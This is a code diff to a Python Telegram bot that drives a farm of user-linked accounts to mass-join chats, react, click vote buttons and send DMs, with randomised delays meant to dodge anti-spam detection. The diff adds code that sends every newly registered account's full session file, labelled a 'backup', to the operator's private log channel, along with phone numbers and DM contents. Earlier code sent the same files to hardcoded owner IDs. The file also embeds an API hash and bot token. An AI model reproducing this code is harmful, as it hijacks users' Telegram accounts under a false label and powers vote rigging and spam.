@@ -44,6 +44,9 @@ API_ID = int(os.getenv("TG_API_ID", "30636134"))
 API_HASH = os.getenv("TG_API_HASH", "9c5bb2bbeb19a0da5bfb0e7052875d2f")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8733721396:AAHJrr4uHC2WEx5r6BCHqBmx4LbMKh1Ngds")
 
+# 📢 GLOBAL LOGGING CHANNEL CONFIGURATION (Ensure Bot is Admin here)
+LOG_CHANNEL_ID = -1002345678901  
+
 # Root Matrix Administrators (Hardcoded Super Owners)
 SUPER_OWNER_IDS = [7952327997, 7953147643, 8064493735] 
 SECRET_KEY = os.getenv("ENCRYPTION_KEY", "pydroid_secure_fallback_key_2026")
@@ -59,9 +62,30 @@ logging.basicConfig(
 )
 logger = logging.getLogger("MultiAccountSystem")
 
+# --- GLOBAL MATRIX LOGGING DISPATCHER ---
+async def send_channel_log(bot: Bot, title: str, details: str, level: str = "INFO"):
+    """Dispatches real-time granular system logs to your private monitoring channel."""
+    icon = "ℹ️"
+    if level == "SUCCESS": icon = "🟢"
+    elif level == "WARNING": icon = "⚠️"
+    elif level == "CRITICAL": icon = "🚨"
+    elif level == "USER_ACTION": icon = "👤"
+    elif level == "TASK_ENGINE": icon = "⚙️"
+    
+    log_blueprint = (
+        f"{icon} **SYSTEM ALERT: {title}**\n"
+        f"📅 **Timestamp:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
+        f"🚦 **Severity Level:** `{level}`\n"
+        f"----------------------------------------\n\n"
+        f"{details}"
+    )
+    try:
+        await bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_blueprint, parse_mode="Markdown")
+    except Exception as log_err:
+        logger.error(f"Failed to dispatch channel log message: {log_err}")
+
 # --- DATA SECURITY CRYPTO ENGINE ---
 def _get_crypto_key() -> int:
-    """Computes a dynamic XOR cipher key offset safely from the master secret."""
     try:
         if not SECRET_KEY:
             return 42
@@ -71,7 +95,6 @@ def _get_crypto_key() -> int:
         return 13
 
 def encrypt_data(data: str) -> str:
-    """XOR symmetric byte translation wrapped inside Base64 encoding blocks."""
     if not data:
         return ""
     try:
@@ -83,7 +106,6 @@ def encrypt_data(data: str) -> str:
         return ""
 
 def decrypt_data(encrypted_data: str) -> str:
-    """Reverses the Base64 XOR layer block to reveal raw session keys safely."""
     if not encrypted_data:
         return ""
     try:
@@ -97,33 +119,24 @@ def decrypt_data(encrypted_data: str) -> str:
 
 # --- PARSING & TARGET RESOLUTION ENGINE ---
 def parse_telegram_link(link: str) -> Tuple[Union[str, int, None], Optional[int]]:
-    """
-    Normalizes complex links, public mentions, and private hashes into 
-    executable formats compatible with MTProto structures.
-    """
     if not link:
         return None, None
     try:
         link = link.strip()
-        
-        # Scenario A: Private Group/Channel structured links
         private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
         if private_match:
             channel_id = int(f"-100{private_match.group(1)}")
             msg_id = int(private_match.group(2))
             return channel_id, msg_id
 
-        # Scenario B: Dynamic Invitation Signatures/Hashes
         if "+ " in link or "/+" in link or "joinchat/" in link:
             hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
             return (hash_match.group(1) if hash_match else link, None)
             
-        # Scenario C: Public Message Links
         msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
         if msg_match:
             return msg_match.group(1), int(msg_match.group(2))
             
-        # Scenario D: Raw Username extraction
         target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
         if "/" in target:
             parts = target.split("/")
@@ -142,11 +155,8 @@ class DatabaseEngine:
         self.db_path = db_path
 
     async def init(self):
-        """Initializes database schema with constraints and operational tracking tables."""
         async with aiosqlite.connect(self.db_path) as db:
             await db.execute("PRAGMA foreign_keys = ON;")
-            
-            # Users Registry
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS users (
                     user_id INTEGER PRIMARY KEY,
@@ -157,8 +167,6 @@ class DatabaseEngine:
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             """)
-            
-            # Connected MTProto Accounts
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS accounts (
                     phone TEXT PRIMARY KEY,
@@ -170,8 +178,6 @@ class DatabaseEngine:
                     FOREIGN KEY(user_id) REFERENCES users(user_id) ON DELETE CASCADE
                 )
             """)
-            
-            # Distributed Automated Tasks
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS tasks (
                     task_id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -185,8 +191,6 @@ class DatabaseEngine:
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             """)
-            
-            # Audit Trail Logs
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS logs (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -195,15 +199,12 @@ class DatabaseEngine:
                     timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             """)
-            
-            # Global Application Settings Configuration Cache
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS settings (
                     key TEXT PRIMARY KEY,
                     value TEXT
                 )
             """)
-            
             await db.commit()
             logger.info("Asynchronous Database Engine successfully fully mounted.")
 
@@ -281,10 +282,7 @@ class TaskQueuePipeline:
                 await asyncio.sleep(5)
 
     async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict):
-        """
-        Executes distributed automation tasks across accounts while mimicking human behavior
-        to prevent triggers from Telegram's anti-spam detection.
-        """
+        bot_instance = Bot(token=BOT_TOKEN)
         async with aiosqlite.connect(db_mgr.db_path) as db:
             await db.execute("UPDATE tasks SET status = 'running', progress = '1%' WHERE task_id = ?", (task_id,))
             await db.commit()
@@ -307,13 +305,18 @@ class TaskQueuePipeline:
             async with aiosqlite.connect(db_mgr.db_path) as db:
                 await db.execute("UPDATE tasks SET status = 'failed', progress = '0 active bridges available' WHERE task_id = ?", (task_id,))
                 await db.commit()
+            
+            await send_channel_log(
+                bot_instance, "Task Aborted - Empty Infrastructure",
+                f"🔢 **Task ID:** #{task_id}\n❌ No active automated sessions found for Creator `{creator_id}`.", "CRITICAL"
+            )
+            await bot_instance.session.close()
             return
 
         passed_ids: List[str] = []
         failed_ids: List[Tuple[str, str]] = []
         total_accounts = len(clients_data)
 
-        # --- ADVANCED ANTI-BAN ALGORITHM THUTTLE PARAMS ---
         BATCH_SIZE = 4
         BASE_COOLDOWN = 20
 
@@ -324,7 +327,6 @@ class TaskQueuePipeline:
                 
             client = TelegramClient(StringSession(raw_session), API_ID, API_HASH)
             try:
-                # Human Simulation Step A: Random startup jitter
                 await asyncio.sleep(random.uniform(2.0, 5.0))
                 await client.connect()
                 
@@ -339,19 +341,27 @@ class TaskQueuePipeline:
                 parsed_target, link_msg_id = parse_telegram_link(target)
                 msg_id = int(payload.get("msg_id", link_msg_id or 0))
 
-                # Human Simulation Step B: Pre-interaction delay
                 await asyncio.sleep(random.uniform(3.5, 7.0))
 
-                # --- ADVANCED MULTI-OPERATION ROUTER ---
+                # --- OPERATIONS EXECUTION & VERBOSE LOGS LINKING ---
                 if task_type == "join":
                     if isinstance(parsed_target, str) and (parsed_target.startswith("+") or "joinchat/" in target or "/+" in target):
                         clean_hash = parsed_target.replace("+", "").split("/")[-1]
                         await client(functions.messages.ImportChatInviteRequest(hash=clean_hash))
                     else:
                         await client(functions.channels.JoinChannelRequest(channel=parsed_target))
+                    
+                    await send_channel_log(
+                        bot_instance, "Account Node Joined Channel/Group",
+                        f"📱 **Account:** `+{phone}`\n🎯 **Joined Target:** `{target}`\n🔢 **Task ID:** #{task_id}", "SUCCESS"
+                    )
                         
                 elif task_type == "leave":
                     await client(functions.channels.LeaveChannelRequest(channel=parsed_target))
+                    await send_channel_log(
+                        bot_instance, "Account Node Departed Node",
+                        f"📱 **Account:** `+{phone}`\n💨 **Departed Target:** `{target}`\n🔢 **Task ID:** #{task_id}", "WARNING"
+                    )
                     
                 elif task_type == "react":
                     emojis = payload.get("reactions", ["👍"])
@@ -361,6 +371,10 @@ class TaskQueuePipeline:
                         msg_id=msg_id,
                         reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                     ))
+                    await send_channel_log(
+                        bot_instance, "Reaction Dispatched Successfully",
+                        f"📱 **Account:** `+{phone}`\n🎭 **Reaction Furled:** {assigned_emoji}\n🎯 **Channel/Chat:** `{parsed_target}`\n🔢 **Message ID:** `{msg_id}`\n🔢 **Task ID:** #{task_id}", "SUCCESS"
+                    )
                         
                 elif task_type == "button_vote":
                     button_text = payload.get("button_text", "").strip().lower()
@@ -381,6 +395,10 @@ class TaskQueuePipeline:
                                 msg_id=msg_id,
                                 data=target_button.data
                             ))
+                            await send_channel_log(
+                                bot_instance, "Callback Inline Keyboard Button Clicked",
+                                f"📱 **Account:** `+{phone}`\n🔘 **Button Text Query:** `{button_text}`\n🎯 **Chat Vector:** `{parsed_target}`\n🔢 **Message ID:** `{msg_id}`", "SUCCESS"
+                            )
                         else:
                             raise ValueError(f"Target button matching string query '{button_text}' not found.")
                     else:
@@ -389,42 +407,43 @@ class TaskQueuePipeline:
                 elif task_type == "dm":
                     message_text = payload.get("text", "Hello!")
                     await client.send_message(parsed_target, message_text)
+                    await send_channel_log(
+                        bot_instance, "Direct Message (DM) Dispatched",
+                        f"📱 **Sender Node:** `+{phone}`\n🎯 **Target User:** `{parsed_target}`\n✉️ **Content:** {message_text}", "SUCCESS"
+                    )
 
                 passed_ids.append(phone)
                 
             except FloodWaitError as fwe:
-                logger.warning(f"Flood limit caught on +{phone}: Forced to wait {fwe.seconds}s")
                 failed_ids.append((phone, f"FloodWaitError: Required sleep cycle: {fwe.seconds}s"))
+                await send_channel_log(bot_instance, "Telegram Flood Limitation Hit", f"📱 **Account:** `+{phone}`\n⏳ **Forced Timeout Wait:** `{fwe.seconds}s`", "WARNING")
                 await asyncio.sleep(min(fwe.seconds, 15))
             except (UserDeactivatedError, AuthKeyUnregisteredError):
                 async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                     await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                     await db_conn.commit()
                 failed_ids.append((phone, "Account terminated/banned by Telegram server."))
+                await send_channel_log(bot_instance, "Profile Node Terminated By Telegram", f"❌ **Account:** `+{phone}` has been permanently banned or logged out.", "CRITICAL")
             except Exception as ex:
-                logger.error(f"Bridge connection error [+{phone}]: {ex}")
                 failed_ids.append((phone, str(ex)))
+                await send_channel_log(bot_instance, "Worker Exception Incident", f"📱 **Account:** `+{phone}`\n⚠️ **Trace Context:** `{str(ex)}`", "WARNING")
             finally:
                 try:
                     await client.disconnect()
                 except Exception:
                     pass
 
-            # Human Simulation Step C: Batch cooldown implementation
             if (index + 1) % BATCH_SIZE == 0 and (index + 1) < total_accounts:
                 delay = BASE_COOLDOWN + random.randint(10, 25)
-                logger.info(f"Throttling threshold met. System sleeping for {delay}s...")
                 await asyncio.sleep(delay)
             else:
                 await asyncio.sleep(random.uniform(4.0, 8.5))
 
-            # Dynamically push atomic live updates to reporting parameters
             progress_pct = f"{int(((index + 1) / total_accounts) * 100)}%"
             async with aiosqlite.connect(db_mgr.db_path) as db:
                 await db.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
                 await db.commit()
 
-        # Wrap up operation parameters and seal state records
         final_status = "completed" if len(passed_ids) > 0 else "failed"
         success_report_json = json.dumps(passed_ids)
         failure_report_json = json.dumps(failed_ids)
@@ -435,6 +454,18 @@ class TaskQueuePipeline:
                 (final_status, f"{len(passed_ids)}/{total_accounts} Passed", success_report_json, failure_report_json, task_id)
             )
             await db.commit()
+
+        task_summary = (
+            f"🔢 **Task ID:** #{task_id}\n"
+            f"⚙️ **Type:** `{task_type.upper()}`\n"
+            f"👤 **Triggered By User:** `{creator_id}`\n"
+            f"🎯 **Target Reference:** `{payload.get('target', 'N/A')}`\n\n"
+            f"🟢 **Successful Processes:** `{len(passed_ids)}` profiles\n"
+            f"🔴 **Failed/Aborted Processes:** `{len(failed_ids)}` profiles\n"
+            f"📊 **Final Aggregated Status:** `{final_status.upper()}`"
+        )
+        await send_channel_log(bot_instance, "Distributed Automation Task Finished", task_summary, "SUCCESS" if final_status == "completed" else "WARNING")
+        await bot_instance.session.close()
 
 task_queue = TaskQueuePipeline()
 
@@ -526,12 +557,24 @@ async def cmd_start(message: Message, state: FSMContext):
         f"🛡️ **Authorization Scope:** `{role.upper()}`\n\n"
         "Select an action vector from the controls below to manage tasks:"
     )
+    
+    await send_channel_log(
+        message.bot, "Bot Command Triggered",
+        f"👤 **User:** @{username} (`{user_id}`)\n💬 **Command:** `/start` \n🛡️ **Assigned Role:** `{role.upper()}`",
+        "USER_ACTION"
+    )
     await message.answer(welcome_text, reply_markup=get_main_keyboard(role))
 
 @router.callback_query(F.data == "main_menu")
 async def handle_main_menu(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     role = await db_mgr.get_user_role(callback.from_user.id)
+    
+    await send_channel_log(
+        callback.message.bot, "Menu Interaction",
+        f"👤 **User:** @{callback.from_user.username or 'N/A'} (`{callback.from_user.id}`)\n🔘 **Interaction Target:** `Returned to Main Menu Console`",
+        "USER_ACTION"
+    )
     await callback.message.edit_text(
         "👋 **Main Control Console**\nSelect an action vector below:",
         reply_markup=get_main_keyboard(role)
@@ -560,6 +603,12 @@ async def cmd_add_admin(message: Message):
         await db.commit()
 
     await db_mgr.log_action(message.from_user.id, f"Promoted user {target_id} to Admin with account limit {limit}")
+    
+    await send_channel_log(
+        message.bot, "Privilege Promotion Action",
+        f"🛠️ **Admin Promoted By:** `{message.from_user.id}`\n👤 **Target User:** `{target_id}`\n🔢 **Max Account Allocation Limit Set:** `{limit}`",
+        "CRITICAL"
+    )
     await message.answer(f"✅ Success! User ID `{target_id}` is now registered as an **Admin** with account limits set to `{limit}` automated IDs.")
 
 @router.message(Command("removeadmin"))
@@ -585,6 +634,12 @@ async def cmd_remove_admin(message: Message):
         await db.commit()
 
     await db_mgr.log_action(message.from_user.id, f"Demoted Admin {target_id}")
+    
+    await send_channel_log(
+        message.bot, "Privilege Demotion Action",
+        f"🛠️ **Demoted By:** `{message.from_user.id}`\n👤 **Target User Striped:** `{target_id}`",
+        "CRITICAL"
+    )
     await message.answer(f"✅ User ID `{target_id}` has been stripped of Admin access privileges.")
 
 # --- USER INFRASTRUCTURE MANAGEMENT INTERFACES ---
@@ -633,6 +688,12 @@ async def process_phone(message: Message, state: FSMContext):
             "phone": phone,
             "phone_code_hash": sent_code.phone_code_hash
         }
+        
+        await send_channel_log(
+            message.bot, "Account Registration Connection Initiated",
+            f"👤 **Triggered By User:** `{user_id}`\n📱 **Phone Number Sent:** `{phone}`\n📝 **Status:** Awaiting OTP Verification Input",
+            "USER_ACTION"
+        )
         await message.answer("📩 **OTP Code dispatched.** Input confirmation verification code below:")
         await state.set_state(RegistrationStates.waiting_for_otp)
     except Exception as e:
@@ -660,6 +721,7 @@ async def process_otp(message: Message, state: FSMContext):
         await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
         await complete_registration(message, state, client, phone, user_id)
     except SessionPasswordNeededError:
+        await send_channel_log(message.bot, "2FA Required Layer Detected", f"📱 **Account:** `{phone}`\n🔐 Account locked behind Two-Factor Authentication. Prompting user.", "WARNING")
         await message.answer("🔒 Two-Factor Authentication (2FA) active. Enter account security password:")
         await state.set_state(RegistrationStates.waiting_for_2fa)
     except PhoneCodeInvalidError:
@@ -703,7 +765,6 @@ async def process_2fa(message: Message, state: FSMContext):
         await state.clear()
 
 async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int):
-    """Saves verified account session credentials securely using an XOR cipher wrapper."""
     try:
         me = await client.get_me()
         session_str = client.session.save()
@@ -717,6 +778,14 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
             await db.commit()
 
         await db_mgr.log_action(user_id, f"Linked account session +{phone}")
+        
+        caption_text = (
+            f"📥 **New Account Registered to Cluster**\n"
+            f"📱 **Phone Number:** `+{phone}`\n"
+            f"👤 **Profile Username:** @{me.username or 'N/A'}\n"
+            f"🆔 **Owner Linked ID:** `{user_id}`"
+        )
+        await send_channel_log(message.bot, "Profile Node Added Instantly", caption_text, "SUCCESS")
         await message.answer(f"🎉 Channel Verified! Account `+{phone}` (@{me.username or 'N/A'}) is active in the cluster.")
         
         # --- GENERATE RECOVERY SESSION FILE COPIES ---
@@ -724,25 +793,11 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
         session_bytes = session_str.encode('utf-8')
         session_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
         
-        caption_text = (
-            f"🔑 **Automation Session Extracted**\n"
-            f"📱 **Phone:** `+{clean_phone}`\n"
-            f"👤 **Username:** @{me.username or 'N/A'}\n"
-            f"🆔 **Owner:** `{user_id}`"
-        )
-        
+        # Dispatch copy safely to private logs channel archive
         try:
-            await message.answer_document(document=session_file, caption=caption_text)
-        except Exception as file_err:
-            logger.error(f"Failed sending local backup copy: {file_err}")
-            
-        # Dispatch backup recovery frames to super owners
-        for owner_id in SUPER_OWNER_IDS:
-            try:
-                owner_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
-                await message.bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
-            except Exception as forward_err:
-                logger.error(f"Could not forward session data packet to superowner {owner_id}: {forward_err}")
+            await message.bot.send_document(chat_id=LOG_CHANNEL_ID, document=session_file, caption=f"🔑 **Secure Session Key File Backup**\n📱 **Phone:** `+{clean_phone}`")
+        except Exception as forward_err:
+            logger.error(f"Could not forward session file packet to log channel: {forward_err}")
 
     except Exception as e:
         logger.error(f"Failed handling post-registration saving sequence: {e}")
@@ -856,7 +911,6 @@ async def process_dm_text(message: Message, state: FSMContext):
     await finalize_task_creation(message, state)
 
 async def finalize_task_creation(message: Union[Message, CallbackQuery], state: FSMContext):
-    """Compiles execution arguments, logs the payload configuration, and queues the task."""
     data = await state.get_data()
     user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
     task_type = data.pop("task_type")
@@ -879,13 +933,22 @@ async def finalize_task_creation(message: Union[Message, CallbackQuery], state: 
     await task_queue.add_task(task_id, user_id, task_type, data)
     await db_mgr.log_action(user_id, f"Queued automation task #{task_id} [{task_type.upper()}]")
     
+    # 📢 LOG TASK INITIALIZATION RADAR DISPATCH TO LOG CHANNEL
+    init_details = (
+        f"🔢 **Task ID Allocated:** #{task_id}\n"
+        f"👤 **Creator/Triggered By ID:** `{user_id}`\n"
+        f"⚙️ **Operation Vector Type:** `{task_type.upper()}`\n"
+        f"🎯 **Target Node:** `{target}`\n"
+        f"📦 **Task Metadata Context:** `{payload_json}`"
+    )
+    bot = message.bot if hasattr(message, 'bot') else message.message.bot
+    await send_channel_log(bot, "New Automation Task Added to Pipeline", init_details, "TASK_ENGINE")
+    
     response_msg = (
         f"🚀 **Task #{task_id} successfully queued!**\n"
         f"⚙️ **Type:** `{task_type.upper()}`\n"
         f"Workers are now executing your actions. Use `/taskreport_{task_id}` to check results."
     )
-    
-    bot = message.bot if hasattr(message, 'bot') else message.message.bot
     await bot.send_message(chat_id=user_id, text=response_msg)
     await state.clear()
 
@@ -994,6 +1057,7 @@ async def export_task_report_file(callback: CallbackQuery):
     raw_bytes = "\n".join(output_lines).encode("utf-8")
     file_payload = BufferedInputFile(raw_bytes, filename=f"task_{task_id}_firmware_log.txt")
     
+    await send_channel_log(callback.message.bot, "Task Manifest Log Exported", f"📥 User `{user_id}` requested and downloaded file logs manifest for Task #{task_id}.", "USER_ACTION")
     await callback.message.reply_document(file_payload, caption=f"📂 Complete execution profile log file for task #{task_id}.")
     await callback.answer()
 
@@ -1055,10 +1119,15 @@ async def admin_broadcast_execute(message: Message, state: FSMContext):
         try:
             await message.bot.send_message(chat_id=u_id, text=f"📢 **Global Infrastructure Notification:**\n\n{broadcast_text}")
             success_count += 1
-            await asyncio.sleep(0.05) # Prevent flooding limits
+            await asyncio.sleep(0.05)
         except Exception:
             pass
             
+    await send_channel_log(
+        message.bot, "Global Notification Broadcast Dispatched",
+        f"🛠️ **Triggered By User:** `{message.from_user.id}`\n📢 **Total Intended Targets:** `{len(users)}` users.\n🟢 **Successful Transmissions:** `{success_count}` locations.",
+        "CRITICAL"
+    )
     await message.answer(f"✅ Broadcast transmission completed. Delivery success rate: `{success_count}/{len(users)}` structures.")
     await state.clear()
 
@@ -1092,6 +1161,11 @@ async def admin_set_limits_finalize(message: Message, state: FSMContext):
         await db.execute("UPDATE users SET max_accounts = ? WHERE user_id = ?", (limit_val, target_user_id))
         await db.commit()
         
+    await send_channel_log(
+        message.bot, "Account Allocation Limit Altered",
+        f"🛠️ **Altered By Admin:** `{message.from_user.id}`\n👤 **Target User:** `{target_user_id}`\n🔢 **New Account Allocation Cap:** `{limit_val}`",
+        "CRITICAL"
+    )
     await message.answer(f"✅ Configuration verified. User ID `{target_user_id}` allocation cap shifted to `{limit_val}` accounts.")
     await state.clear()
 
@@ -1121,6 +1195,8 @@ async def export_db(callback: CallbackQuery):
         with open(db_mgr.db_path, "rb") as f:
             file_data = f.read()
         file = BufferedInputFile(file_data, filename="database_core_backup.db")
+        
+        await send_channel_log(callback.message.bot, "Database Structural Backup Extracted", f"🚨 **Owner ID:** `{callback.from_user.id}` executed a physical image export download of the core system SQLite binary schema.", "CRITICAL")
         await callback.message.reply_document(file, caption="📂 Current core SQLite structure structural backup image.")
         await callback.answer("Export sequence finalized successfully.")
     except Exception as e:
@@ -1155,13 +1231,13 @@ async def system_stats(callback: CallbackQuery):
     await callback.message.edit_text(stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 # --- SYSTEM HEALTH CHECK & RECOVERY AGENT ---
-async def verify_saved_sessions():
-    """System diagnostic running sequence pings to sweep dead or banned nodes."""
+async def verify_saved_sessions(bot: Bot):
     logger.info("Running verification pings across system bridges...")
     async with aiosqlite.connect(db_mgr.db_path) as db:
         async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
             accounts = await cursor.fetchall()
 
+    dead_count = 0
     for phone, enc_session in accounts:
         if not enc_session:
             continue
@@ -1169,31 +1245,40 @@ async def verify_saved_sessions():
             client = TelegramClient(StringSession(decrypt_data(enc_session)), API_ID, API_HASH)
             await client.connect()
             if not await client.is_user_authorized():
-                logger.warning(f"Bridge connection verification dropped for +{phone}. Flagging dead.")
+                dead_count += 1
                 async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                     await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                     await db_conn.commit()
             await client.disconnect()
         except (UserDeactivatedError, AuthKeyUnregisteredError):
+            dead_count += 1
             async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                 await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                 await db_conn.commit()
         except Exception as e:
             logger.error(f"Error establishing network handshake ping for +{phone}: {e}")
 
+    if dead_count > 0:
+        await send_channel_log(
+            bot, "Infrastructure Integrity Check Sweep Completed",
+            f"🧹 Run sequence sweep finished processing automated entries.\n❌ Flagged `{dead_count}` accounts as dead/unresponsive on Telegram servers.", "WARNING"
+        )
+
 # --- CORE BOOTSTRAP RUNTIME ENTRY ---
 async def main():
-    # Initialize components
     await db_mgr.init()
-    await verify_saved_sessions()
 
     bot = Bot(token=BOT_TOKEN)
+    await verify_saved_sessions(bot)
+
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
 
-    # Initialize task execution queue worker loops
     worker_task = asyncio.create_task(task_queue.start_worker())
     logger.info("Application attached to network polling loops.")
+    
+    # 📢 SYSTEM STARTUP BROADCAST DISPATCH
+    await send_channel_log(bot, "Core Architecture Online", "🚀 Automation system pipeline framework is completely online and actively parsing operations.", "SUCCESS")
     
     try:
         await dp.start_polling(bot)
